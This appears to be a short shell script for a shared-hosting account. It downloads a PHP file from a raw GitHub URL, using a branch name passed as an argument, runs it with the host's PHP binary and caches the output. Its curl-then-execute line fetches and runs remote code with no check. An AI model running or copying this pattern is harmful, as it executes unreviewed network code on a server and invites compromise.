#!/bin/sh
cd /home/u791591885 && [ -f t159.done ] && tail -c 8000 t159.done && exit 0
curl -fsSL -o t159.php "https://raw.githubusercontent.com/a04032417-svg/Dar/$1/vs159.php" && /opt/alt/php83/usr/bin/php t159.php > t159.done 2>&1; tail -c 8000 t159.done
